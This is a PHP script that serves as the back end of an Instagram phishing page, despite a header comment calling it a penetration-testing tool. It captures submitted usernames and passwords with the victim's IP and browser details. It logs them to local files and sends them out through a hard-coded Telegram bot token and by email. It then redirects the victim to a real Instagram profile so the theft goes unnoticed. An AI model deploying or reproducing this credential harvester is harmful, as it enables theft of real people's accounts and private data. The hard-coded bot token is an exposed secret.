<?php
// === INSTAGRAM PROFILE PHISHING CAPTURE ===
// For authorized penetration testing only

// === CONFIGURATION (UPDATE THESE) ===
$telegram_enabled = true;
$telegram_bot_token = '8390891357:AAGptBpmPfr3X-MXEogr_pK1ql5E83msYDA';
$telegram_chat_id = '6837057860';    // Your chat ID

$email_enabled = true;
$notify_email = 'your_email@example.com';         // Where to receive alerts
$email_subject = '🚨 Instagram Profile Login Captured';

// === SECURITY: Block direct access ===
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.0 403 Forbidden');
    exit('Access Denied');
}

// Get captured data
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$timestamp = date('Y-m-d H:i:s');
$user_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';

// Victim details
$victim_data = [
    'timestamp' => $timestamp,
    'ip' => $user_ip,
    'user_agent' => $user_agent,
    'referer' => $referer,
    'username' => $username,
    'password' => $password
];

// === 1. LOCAL LOGGING ===
$log_entry = implode(' | ', $victim_data) . "\n";
file_put_contents('instagram_captures.txt', $log_entry, FILE_APPEND | LOCK_EX);

// CSV for analysis
$csv_file = fopen('instagram_captures.csv', 'a');
fputcsv($csv_file, $victim_data);
fclose($csv_file);

// === 2. TELEGRAM ALERT ===
if ($telegram_enabled && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
    $telegram_message = "🔐 *Instagram Profile Captured*\n\n" .
                       "📅 *Time:* $timestamp\n" .
                       "🌐 *IP:* `$user_ip`\n" .
                       "👤 *Username:* `$username`\n" .
                       "🔑 *Password:* `$password`\n" .
                       "📱 *Device:* " . substr($user_agent, 0, 100) . "\n\n" .
                       "🎯 *Profile Phishing Success*";

    $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $telegram_data = [
        'chat_id' => $telegram_chat_id,
        'text' => $telegram_message,
        'parse_mode' => 'Markdown'
    ];

    $telegram_options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($telegram_data)
        ]
    ];
    $telegram_context = stream_context_create($telegram_options);
    @file_get_contents($telegram_url, false, $telegram_context);
}

// === 3. EMAIL ALERT ===
if ($email_enabled && !empty($notify_email)) {
    $email_body = "Instagram Profile Login Captured:\n\n" .
                 "Time: $timestamp\n" .
                 "IP: $user_ip\n" .
                 "User Agent: $user_agent\n" .
                 "Username: $username\n" .
                 "Password: $password\n\n" .
                 "Full Log saved to instagram_captures.txt";

    $email_headers = "From: Instagram-Security-Test <noreply@pentest.local>\r\n";
    $email_headers .= "Reply-To: noreply@pentest.local\r\n";
    $email_headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($notify_email, $email_subject, $email_body, $email_headers);
}

// === 4. REDIRECT TO REAL INSTAGRAM (stealth) ===
header('Location: https://www.instagram.com/_._sammi_glsy_/?utm_source=ig_web_button_share_sheet');
exit;
?>